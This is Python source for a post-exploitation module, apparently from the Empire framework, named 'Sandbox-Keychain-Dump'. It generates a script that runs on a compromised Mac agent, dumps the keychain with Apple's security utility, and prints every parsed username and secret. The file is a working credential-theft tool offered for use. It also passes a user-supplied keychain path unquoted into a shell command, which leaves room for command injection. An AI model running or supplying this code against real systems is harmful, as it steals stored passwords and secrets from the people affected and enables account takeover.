class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Sandbox-Keychain-Dump',

            # list of one or more authors for the module
            'Author': ['@import-au'],

            # more verbose multi-line description of the module
            'Description': ("Uses Apple Security utility to dump the contents of the keychain. "
                            "WARNING: Will prompt user for access to each key."
                            "On High Sierra, this will also ask the user for their password for each key."),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                ""
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'KeyChain' : {
                'Description'   :   'Manual location of keychain to decrypt, otherwise default.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        keyChain = self.options['KeyChain']['Value']

        script = """
import subprocess
import re

process = subprocess.Popen('security dump-keychain -d %s', stdout=subprocess.PIPE, shell=True)
result = process.communicate()
keychain = result[0].strip()
find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
accounts = find_account.findall(keychain)
for account in accounts:
    print("System: " + account[0])
    print("Description: " + account[2])
    print("Username: " + account[1])
    print("Secret: " + account[3])

""" % (keyChain)

        return script
